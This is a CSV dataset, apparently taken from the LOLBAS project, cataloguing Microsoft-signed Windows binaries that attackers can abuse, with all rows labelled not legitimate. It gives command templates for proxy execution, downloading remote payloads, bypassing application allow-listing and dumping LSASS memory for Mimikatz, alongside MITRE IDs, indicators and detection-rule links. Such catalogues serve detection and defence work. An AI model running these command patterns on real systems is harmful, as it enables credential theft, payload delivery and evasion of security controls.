"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_MitreID","Commands_OperatingSystem","Commands_Tags","Commands_Tags_Download","Full_Path","Full_Path_Path","Detection","Detection_IOC","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Commands_Tags_Execute","Resources","Resources_Link","Code_Sample","Code_Sample_Code","Detection_Sigma","Detection_Analysis","Detection_BlockRule","Commands_Tags_Requires","Commands_Tags_Input","Detection_Splunk","Detection_Elastic","Aliases","Aliases_Alias","Commands_Tags_Application","Commands_Tags_Type","is_legit"
"Teams.exe","Electron runtime binary which runs the Teams application","Andrew Kisliakov","2022-01-17","","[''teams.exe''-|-''teams.exe''-|-''teams.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""'']","[''Generate JavaScript payload and package.json, and save to ""%LOCALAPPDATA%\\Microsoft\\Teams\\current\\app\\"" before executing.''-|-''Generate JavaScript payload and package.json, archive in ASAR file and save to ""%LOCALAPPDATA%\\Microsoft\\Teams\\current\\app.asar"" before executing.''-|-''Teams spawns cmd.exe as a child process of teams.exe and executes the ping command'']","[''Execute JavaScript code''-|-''Execute JavaScript code''-|-''Executes a process under a trusted Microsoft signed binary'']","[''Execute''-|-''Execute''-|-''Execute'']","[''User''-|-''User''-|-''User'']","[''T1218.015''-|-''T1218.015''-|-''T1218.015'']","[''Windows 10, Windows 11''-|-''Windows 10, Windows 11''-|-''Windows 10, Windows 11'']","","","","C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Teams.exe","","[''%LOCALAPPDATA%\Microsoft\Teams\current\app directory created''-|-''%LOCALAPPDATA%\Microsoft\Teams\current\app.asar file created/modified by non-Teams installer/updater'']","","[''Andrew Kisliakov''-|-''mr.d0x'']","@mrd0x","[''Node.JS''-|-''Node.JS''-|-''CMD'']","","https://l--k.uk/2022/01/16/microsoft-teams-and-other-electron-apps-as-lolbins/","","https://github.com/lltltk/LOLBAS-research/tree/master/Teams","https://github.com/SigmaHQ/sigma/blob/43277f26fc1c81fc98fc79147b711189e901b757/rules/windows/process_creation/proc_creation_win_susp_electron_exeuction_proxy.yml","","","","","","","","","","","false"
"te.exe","Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).","Oddvar Moe","2018-05-25","","[''te.exe {PATH:.wsc}''-|-''te.exe {PATH:.dll}'']","[''Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.''-|-''Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures.'']","[''Execute Visual Basic script stored in local Windows Script Component file.''-|-''Execute DLL file.'']","[''Execute''-|-''Execute'']","[''User''-|-''User'']","[''T1127''-|-''T1127'']","[''Windows''-|-''Windows'']","","","","no default","","","","[''Giuseppe N3mes1s''-|-''Avihay Eldad'']","[''@gN3mes1s''-|-''@AvihayEldad'']","[''WSH''-|-''DLL'']","","[''https://twitter.com/gn3mes1s/status/927680266390384640''-|-''https://github.com/LOLBAS-Project/LOLBAS/pull/359''-|-''https://learn.microsoft.com/en-us/windows-hardware/drivers/taef/authoring-tests'']","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_susp_use_of_te_bin.yml","","","","Custom Format","","","","","","","false"
"Squirrel.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Reegun J (OCBC Bank) - @reegun21","2019-06-26","","[''squirrel.exe --download {REMOTEURL}''-|-''squirrel.exe --update {REMOTEURL}''-|-''squirrel.exe --update {REMOTEURL}''-|-''squirrel.exe --updateRollback={REMOTEURL}''-|-''squirrel.exe --updateRollback={REMOTEURL}'']","[''The above binary will go to url and look for RELEASES file and download the nuget package.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package.''-|-''The above binary will go to url and look for RELEASES file, download and install the nuget package.'']","[''Download binary''-|-''Download and execute binary''-|-''Download and execute binary''-|-''Download and execute binary''-|-''Download and execute binary'']","[''Download''-|-''AWL Bypass''-|-''Execute''-|-''AWL Bypass''-|-''Execute'']","[''User''-|-''User''-|-''User''-|-''User''-|-''User'']","[''T1218''-|-''T1218''-|-''T1218''-|-''T1218''-|-''T1218'']","[''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed''-|-''Windows 7 and up with Microsoft Teams installed'']","","","","C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe","","","","[''Reegun J (OCBC Bank)''-|-''Adam'']","[''@reegun21''-|-''@Hexacorn'']","[''Nuget''-|-''Remote''-|-''Nuget''-|-''Remote''-|-''Nuget''-|-''Remote''-|-''Nuget''-|-''Remote'']","","[''https://www.youtube.com/watch?v=rOP3hnkj7ls''-|-''https://twitter.com/reegun21/status/1144182772623269889''-|-''http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/''-|-''https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12''-|-''https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56'']","","https://github.com/jreegun/POC-s/tree/master/nuget-squirrel","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml","","","","","","","","","","","false"
"SQLToolsPS.exe","Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.","Oddvar Moe","2018-05-25","","SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}","Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.","Execute PowerShell command.","Execute","User","T1218","Windows","","","","C:\Program files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe","","","","Pierre-Alexandre Braeken","@pabraeken","PowerShell","","[''https://twitter.com/pabraeken/status/993298228840992768''-|-''https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-2017'']","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_mssql_sqltoolsps_susp_execution.yml","","","","","https://github.com/splunk/security_content/blob/aa9f7e0d13a61626c69367290ed1b7b71d1281fd/docs/_posts/2021-10-05-suspicious_copy_on_system32.md","","","","","","false"
"Sqlps.exe","Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\100 and 110 are Powershell v2. Microsoft SQL Server\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.","Oddvar Moe","2018-05-25","","Sqlps.exe -noprofile","Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.","Execute PowerShell commands without ScriptBlock logging.","Execute","User","T1218","Windows","","","","[''C:\Program files (x86)\Microsoft SQL Server\100\Tools\Binn\sqlps.exe''-|-''C:\Program files (x86)\Microsoft SQL Server\110\Tools\Binn\sqlps.exe''-|-''C:\Program files (x86)\Microsoft SQL Server\120\Tools\Binn\sqlps.exe''-|-''C:\Program files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe''-|-''C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\SQLPS.exe'']","","","","[''Bryon''-|-''Manny'']","[''@bryon_''-|-''@ManuelBerrueta'']","PowerShell","","[''https://twitter.com/ManuelBerrueta/status/1527289261350760455''-|-''https://twitter.com/bryon_/status/975835709587075072''-|-''https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-2017'']","","","[''https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_mssql_sqlps_susp_execution.yml''-|-''https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/image_load/image_load_dll_system_management_automation_susp_load.yml'']","","","","","https://github.com/splunk/security_content/blob/aa9f7e0d13a61626c69367290ed1b7b71d1281fd/docs/_posts/2021-10-05-suspicious_copy_on_system32.md","https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/execution_suspicious_powershell_imgload.toml","","","","","false"
"Sqldumper.exe","Debugging utility included with Microsoft SQL.","Oddvar Moe","2018-05-25","","[''sqldumper.exe 464 0 0x0110''-|-''sqldumper.exe 540 0 0x01100:40'']","[''Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).''-|-''0x01100:40 flag will create a Mimikatz compatible dump file.'']","[''Dump process using PID.''-|-''Dump LSASS.exe to Mimikatz compatible dump using PID.'']","[''Dump''-|-''Dump'']","[''Administrator''-|-''Administrator'']","[''T1003''-|-''T1003.001'']","[''Windows''-|-''Windows'']","","","","[''C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe''-|-''C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe''-|-''C:\Program Files\Microsoft Power BI Desktop\bin\SqlDumper.exe'']","","","","Luis Rocha","@countuponsec","","","[''https://twitter.com/countuponsec/status/910969424215232518''-|-''https://twitter.com/countuponsec/status/910977826853068800''-|-''https://support.microsoft.com/en-us/help/917825/how-to-use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-se'']","","","https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_susp_sqldumper_activity.yml","","","","","","[''https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_lsass_memdump_file_created.toml''-|-''https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml'']","","","","","false"
"Remote.exe","Debugging tool included with Windows Debugging Tools","mr.d0x","2021-06-01","","[''Remote.exe /s {PATH:.exe} anythinghere''-|-''Remote.exe /s {PATH:.exe} anythinghere''-|-''Remote.exe /s {PATH_SMB:.exe} anythinghere'']","[''Spawns specified executable as a child process of remote.exe''-|-''Spawns specified executable as a child process of remote.exe''-|-''Run a remote file'']","[''Executes a process under a trusted Microsoft signed binary''-|-''Executes a process under a trusted Microsoft signed binary''-|-''Executing a remote binary without saving file to disk'']","[''AWL Bypass''-|-''Execute''-|-''Execute'']","[''User''-|-''User''-|-''User'']","[''T1127''-|-''T1127''-|-''T1127'']","[''Windows''-|-''Windows''-|-''Windows'']","","","","[''C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe''-|-''C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe'']","","remote.exe process spawns","","mr.d0x","@mrd0x","[''EXE''-|-''EXE''-|-''EXE''-|-''Remote'']","","https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/","","","https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml","","","","","","","","","","","false"
"rcsi.exe","Non-Interactive command line inerface included with Visual Studio.","Oddvar Moe","2018-05-25","","[''rcsi.exe {PATH:.csx}''-|-''rcsi.exe {PATH:.csx}'']","[''Use embedded C# within the csx script to execute the code.''-|-''Use embedded C# within the csx script to execute the code.'']","[''Local execution of arbitrary C# code stored in local CSX file.''-|-''Local execution of arbitrary C# code stored in local CSX file.'']","[''Execute''-|-''AWL Bypass'']","[''User''-|-''User'']","[''T1127''-|-''T1127'']","[''Windows''-|-''Windows'']","","","","no default","","","","Matt Nelson","@enigma0x3","[''CSharp''-|-''CSharp'']","","https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/","","","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_csi_execution.yml","","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_csi_execution.yml","","","","[''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml''-|-''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml'']","","","","","false"
"ProtocolHandler.exe","Microsoft Office binary","Nir Chako","2022-07-24","","ProtocolHandler.exe {REMOTEURL}","Downloads payload from remote server","It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)","Download","User","T1105","Windows 10, Windows 11","","","","[''C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe''-|-''C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe''-|-''C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe''-|-''C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\ProtocolHandler.exe''-|-''C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\ProtocolHandler.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office15\ProtocolHandler.exe''-|-''C:\Program Files\Microsoft Office\Office15\ProtocolHandler.exe'']","","Suspicious Office application Internet/network traffic","","Nir Chako (Pentera)","@C_h4ck_0","","","","","","https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_protocolhandler_download.yml","","","","","","","","","","","false"
"Procdump.exe","SysInternals Memory Dump Tool","Alfie Champion (@ajpc500)","2020-10-14","","[''procdump.exe -md {PATH:.dll} explorer.exe''-|-''procdump.exe -md {PATH:.dll} foobar'']","[''Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created.''-|-''Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary.'']","[''Performs execution of unsigned DLL.''-|-''Performs execution of unsigned DLL.'']","[''Execute''-|-''Execute'']","[''User''-|-''User'']","[''T1202''-|-''T1202'']","[''Windows 8.1 and higher, Windows Server 2012 and higher''-|-''Windows 8.1 and higher, Windows Server 2012 and higher'']","","","","no default","","[''Process creation with given '-md' parameter''-|-''Anomalous child processes of procdump''-|-''Unsigned DLL load via procdump.exe or procdump64.exe'']","","Alfie Champion","@ajpc500","[''DLL''-|-''DLL'']","","https://twitter.com/ajpc500/status/1448588362382778372?s=20","","","[''https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_renamed_sysinternals_procdump.yml''-|-''https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_sysinternals_procdump.yml'']","","","","","https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/dump_lsass_via_procdump.yml","https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml","","Procdump64.exe","","","false"
"Powerpnt.exe","Microsoft Office binary.","Reegun J (OCBC Bank)","2019-07-19","","Powerpnt.exe {REMOTEURL}","Downloads payload from remote server","It will download a remote payload and place it in INetCache.","Download","User","T1105","Windows","","INetCache","","[''C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Powerpnt.exe''-|-''C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Powerpnt.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe''-|-''C:\Program Files\Microsoft Office\Office16\Powerpnt.exe''-|-''C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Powerpnt.exe''-|-''C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Powerpnt.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office15\Powerpnt.exe''-|-''C:\Program Files\Microsoft Office\Office15\Powerpnt.exe''-|-''C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Powerpnt.exe''-|-''C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Powerpnt.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office14\Powerpnt.exe''-|-''C:\Program Files\Microsoft Office\Office14\Powerpnt.exe''-|-''C:\Program Files (x86)\Microsoft Office\Office12\Powerpnt.exe''-|-''C:\Program Files\Microsoft Office\Office12\Powerpnt.exe''-|-''C:\Program Files\Microsoft Office\Office12\Powerpnt.exe'']","","Suspicious Office application Internet/network traffic","","Reegun J (OCBC Bank)","@reegun21","","","[''https://twitter.com/reegun21/status/1150032506504151040''-|-''https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191'']","","","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_office.yml","","","","","","","","","","","false"
